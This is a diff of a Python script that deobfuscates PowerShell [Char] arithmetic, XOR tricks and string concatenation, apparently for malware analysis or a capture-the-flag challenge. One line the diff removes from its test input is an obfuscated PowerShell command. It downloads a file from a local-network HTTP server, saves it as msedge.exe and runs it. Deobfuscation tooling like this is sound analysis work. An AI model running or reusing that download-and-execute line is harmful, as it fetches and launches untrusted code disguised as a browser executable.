@@ -41,7 +41,7 @@ def decode_chr(expr):
         elif simbol[i] == '*':
             result *= numbers[i+1]
         elif simbol[i] == '/':
-            result = result // numbers[i+1]
+            result //= numbers[i+1]
         elif simbol[i] == '%':
             result %= numbers[i+1]
         elif simbol[i] == '^':
@@ -49,7 +49,6 @@ def decode_chr(expr):
     return chr(result)
 
 def check_symbols(symbol):
-
     chr_pattern = re.compile(r'chr\([^()]*\)', re.IGNORECASE)
     chr_substrings = chr_pattern.findall(symbol)
     temp_string = chr_pattern.sub("temp", symbol)
@@ -59,13 +58,17 @@ def check_symbols(symbol):
     return temp_string
 
 def concat_test(code):
+    chrregex = re.compile(r'Chr\([^()]*\)', re.IGNORECASE)
+    stringregex = re.compile(r'".*?"')
+    concatregex = re.compile(r'(Chr\([^()]*\)|".*?")(\s*\+\s*(Chr\([^()]*\)|".*?"))*', re.IGNORECASE)
+    
     matches = concatregex.finditer(code)
     results = []
     for match in matches:
         results.append(match.group(1))
         remaining_text = match.group(0)[len(match.group(1)):].strip()
         while remaining_text:
-            next_match = re.match(r'\s*\+\s*({chr}|{string})'.format(chr=chrregex.pattern, string=stringregex.pattern), remaining_text)
+            next_match = re.match(r'\s*\+\s*(Chr\([^()]*\)|".*?")', remaining_text, re.IGNORECASE)
             if next_match:
                 results.append(next_match.group(1))
                 remaining_text = remaining_text[next_match.end():].strip()
@@ -74,32 +77,38 @@ def concat_test(code):
     gabungin = [decode_chr(result) if result.startswith('Chr') else result.strip('"') for result in results]
     check = code.split('=')
     newcoderes = []
-    print(gabungin)
     for i in range(len(check)):
         newcoderes.append(check_symbols(check[i]))
         if i != len(check) - 1:
             newcoderes.append('=')
-    newcode = ''.join([i  for i in newcoderes]).strip('\n')
-    code = []
+    newcode = ''.join([i for i in newcoderes]).strip('\n')
     newcode = newcode.replace('"', "").replace("'", "")
     for i, element in enumerate(gabungin):
         if len(element) == 1:
             newcode = newcode.replace(results[i], element)
-    return newcode.replace(" ", "").replace("(", "").replace(")","")
+    return newcode.replace(" ", "").replace("(", "").replace(")", "")
 
+
+def Replace(code):
+    pattern = re.compile(r'Replace(\w+),([!@#$%^&*\w]+)', re.IGNORECASE)
+    def replacer(match):
+        return match.group(2)
+    newcode = pattern.sub(replacer, code)
+    newcode = re.sub(r'=\s*', ' = ', newcode).strip()
+    return newcode
 
 def deobfuscate(code):
     code = char_intended(code)
     code = char_transform(code)
     code = concat_test(code)
+    code = Replace(code)
     return code
 
 testing = """
 $tes = [Char]        (70) + [Char](-11   +   100) +               [ChAr](99          -bxor        14) + [CHar](109 -bxor 4) + [ChaR](99 -bxor 13)
-$tes2 = [ChaR](99   -  10  + 1)+[CHAR](109 -bxor   4)
+$tes2 = [ChaR](99   -  10  - 10 + 1)+[CHAR](109 -bxor   4)
 $tes3 = [ChaR](99 -bxor 13)  +  [CHar](109-bxor   4)
-$tes4 = [ChaR](99+               13)   +   [CHar](109 -bxor 4)
-$tes5 = 'hel'+([ChaR](99   +  10) +  [Char](-10   +   100))   +"lo"
-$u='ht'+'tp://192.168.0.16:8282/B64_dec'+'ode_RkxBR3tEYXl1bV90aGlzX'+'2lzX3NlY3JldF9maWxlfQ%3'+'D%3D+/chall_mem_se'+'arch.e'+'xe'+;$t='Wan'+'iTem'+'p';mkdir -force $env:TMP\..\$t;try{iwr $u -OutFile $d\msedge.exe;& $d\msedge.exe;}catch{}
+$tes4 = '[ChaR](99+               13)   +   [CHar](109 -bxor 4)'
+$tes5 = ReplAce('hel'+ ([ChaR](99   +  10) +  [Char](-10   +   100))   +"lo",[ChaR](99+               10)   '+'   [CHar](109 -bxor 4))
 """
 print(deobfuscate(testing))
